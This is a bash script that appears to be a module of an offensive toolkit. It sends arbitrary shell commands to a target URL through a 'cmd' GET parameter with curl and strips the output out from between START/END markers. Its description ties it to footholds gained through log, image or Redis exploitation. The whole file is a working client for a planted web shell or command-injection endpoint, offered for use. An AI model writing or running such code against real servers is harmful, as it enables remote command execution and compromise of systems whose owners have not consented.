#!/usr/bin/env bash

module_init() {
  URL="${1:-}"
  if [[ -z "$URL" ]]; then
    echo "[!] module_init: URL must be provided"
    return 1
  fi
}

send_cmd() {
  local cmd="$1"
  local wrapped_cmd="echo START; $cmd; echo END"
  local out
  out=$(curl -s --get --data-urlencode "cmd=$wrapped_cmd" "$URL")
  out="${out#*START}"
  out="${out%%END*}"
  echo -e "$out"
}

module_main() {
  :
}

module_description() {
  echo "Lightweight command execution module using GET requests. Wraps output between START/END markers for clean parsing.For Log-Image-Redis"
}

show_module_help() {
  cat <<EOF
Usage: $0 <URL>

Description:
  Sends shell commands via HTTP GET requests.
  Output is wrapped between START/END markers for reliable extraction.

Arguments:
  URL    Target endpoint URL
EOF
}
